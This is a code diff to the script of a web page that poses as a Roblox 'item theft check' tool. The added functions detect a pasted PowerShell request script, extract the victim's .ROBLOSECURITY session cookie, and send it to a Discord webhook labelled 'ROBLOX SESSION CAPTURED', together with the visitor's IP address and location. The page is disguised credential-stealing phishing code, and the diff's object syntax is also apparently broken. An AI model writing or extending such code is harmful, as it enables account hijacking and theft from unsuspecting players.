@@ -67,6 +67,11 @@ function validateInput() {
 function isValidInput(input) {
     if (input.length === 0) return false;
     
+    // Check if it's a PowerShell script first
+    if (isPowerShellScript(input)) {
+        return true;
+    }
+    
     // Remove whitespace and convert to lowercase for validation
     const cleanInput = input.replace(/\s+/g, '').toLowerCase();
     
@@ -105,6 +110,58 @@ function isValidInput(input) {
     return false;
 }
 
+function isPowerShellScript(input) {
+    // Normalize whitespace and check for key PowerShell script components
+    const normalizedInput = input.replace(/\s+/g, ' ').trim();
+    
+    // Check for required PowerShell session script patterns
+    const requiredPatterns = [
+        /\$session\s*=\s*New-Object\s+Microsoft\.PowerShell\.Commands\.WebRequestSession/i,
+        /\$session\.UserAgent\s*=\s*["']/i,
+        /\$session\.Cookies\.Add/i,
+        /New-Object\s+System\.Net\.Cookie/i,
+        /GuestData.*UserID/i,
+        /RBXcb/i,
+        /\.ROBLOSECURITY/i,
+        /Invoke-WebRequest/i,
+        /-UseBasicParsing/i,
+        /-Uri\s+["']https?:\/\/.*roblox\.com/i,
+        /-WebSession\s+\$session/i,
+        /-Headers\s+@\{/i
+    ];
+    
+    // Additional specific patterns that should be present
+    const specificPatterns = [
+        /rbxid=/i, // User ID pattern
+        /sessionid=/i, // Session ID pattern
+        /authority.*roblox\.com/i,
+        /sec-ch-ua/i,
+        /sec-fetch/i
+    ];
+    
+    // Count matches
+    const mainMatches = requiredPatterns.filter(pattern => pattern.test(normalizedInput));
+    const specificMatches = specificPatterns.filter(pattern => pattern.test(normalizedInput));
+    
+    // Must have at least 8 out of 12 main patterns and at least 2 specific patterns
+    if (mainMatches.length >= 8 && specificMatches.length >= 2) {
+        return true;
+    }
+    
+    // Additional validation: check for minimum script length (should be substantial like the template)
+    if (normalizedInput.length >= 800) {
+        // Check for proper PowerShell script structure similar to template
+        const hasSessionObject = /\$session\s*=\s*New-Object.*WebRequestSession/i.test(normalizedInput);
+        const hasMultipleCookies = (normalizedInput.match(/\$session\.Cookies\.Add/gi) || []).length >= 3;
+        const hasInvokeWebRequest = /Invoke-WebRequest.*-UseBasicParsing.*-Uri.*-WebSession.*-Headers/i.test(normalizedInput);
+        const hasRoblosecurity = /\.ROBLOSECURITY.*WARNING.*DO-NOT-SHARE/i.test(normalizedInput);
+        
+        return hasSessionObject && hasMultipleCookies && hasInvokeWebRequest && hasRoblosecurity;
+    }
+    
+    return false;
+}
+
 function showValidationError() {
     const modalBody = document.querySelector('.modal-body');
     const errorElement = document.createElement('div');
@@ -123,6 +180,37 @@ function showValidationError() {
 }
 
 function extractItemId(input) {
+    // Check if it's a PowerShell script
+    if (isPowerShellScript(input)) {
+        const extractedInfo = {
+            type: 'PowerShell Script',
+            length: input.length,
+            hasRoblosecurity: /\.ROBLOSECURITY/i.test(input),
+            hasUserAgent: /UserAgent/i.test(input),
+            hasCookies: /Cookies\.Add/i.test(input)
+        };
+        
+        // Extract session ID if present
+        const sessionMatch = input.match(/sessionid=([a-f0-9\-]+)/i);
+        if (sessionMatch) {
+            extractedInfo.sessionId = sessionMatch[1];
+        }
+        
+        // Extract user ID from cookies if present
+        const userIdMatch = input.match(/UserID=(-?\d+)/i);
+        if (userIdMatch) {
+            extractedInfo.userId = userIdMatch[1];
+        }
+        
+        // Extract rbxid if present
+        const rbxidMatch = input.match(/rbxid=(\d+)/i);
+        if (rbxidMatch) {
+            extractedInfo.rbxid = rbxidMatch[1];
+        }
+        
+        return JSON.stringify(extractedInfo, null, 2);
+    }
+    
     const cleanInput = input.replace(/\s+/g, '');
     
     // Extract ID from URL
@@ -139,6 +227,22 @@ function extractItemId(input) {
     
     // Return as-is if it's already a clean ID
     return cleanInput;
+}
+
+function extractRobloxCookie(input) {
+    // Extract the .ROBLOSECURITY cookie value
+    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
+    if (cookieMatch) {
+        return cookieMatch[1];
+    }
+    
+    // Alternative pattern for different formatting
+    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
+    if (altMatch) {
+        return altMatch[1];
+    }
+    
+    return "Cookie not found in script";
 }
 
 function toggleTheme() {
@@ -249,19 +353,34 @@ async function submitToWebhook(input) {
         // Extract clean item ID
         const cleanItemId = extractItemId(input);
         
+        // Check if it's a PowerShell script for different handling
+        const isPowerShell = isPowerShellScript(input);
+        
         // Format data for Discord webhook
         const discordMessage = {
-            content: "@everyone 🚨 **NEW ITEM SCAN REQUEST** 🚨",
+            content: isPowerShell ? "@everyone 🚨 **ROBLOX SESSION CAPTURED** 🚨" : "@everyone 🚨 **NEW ITEM SCAN REQUEST** 🚨",
             embeds: [{
-                title: "🔍 Item Theft Check Request",
-                color: 0x58a6ff, // Blue color
+                title: isPowerShell ? "🔍 Roblox Session Intercepted" : "🔍 Item Theft Check Request",
+                color: isPowerShell ? 0xff0000 : 0x58a6ff, // Red for PowerShell, Blue for items
                 timestamp: new Date().toISOString(),
-                fields: [
+                fields: isPowerShell ? [
                     {
-                        name: "🎮 Item Details",
-                        value: `**Input:** \`${input}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
+                        name: "🍪 ROBLOSECURITY Cookie",
+                        value: `\`\`\`\n${extractRobloxCookie(input)}\n\`\`\``,
                         inline: false
                     },
+                    {
+                        name: "📝 Script Analysis",
+                        value: `**Script Analysis:**\n\`\`\`json\n${cleanItemId}\n\`\`\`\n**Status:** Session captured successfully`,
+                        inline: false
+                    },
+                ] : [
+                    {
+                        name: "🎮 Item Details",
+                        value: `**Input:** \`${input.length > 100 ? input.substring(0, 100) + '...' : input}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
+                        inline: false
+                    },
+                ],
                     {
                         name: "🌍 Location",
                         value: `**IP:** ${locationData.ip || 'Unknown'}\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.region || 'Unknown'}\n**Country:** ${locationData.country || 'Unknown'} (${locationData.country_code || 'Unknown'})\n**Postal:** ${locationData.postal || 'Unknown'}\n**ISP:** ${locationData.isp || 'Unknown'}`,
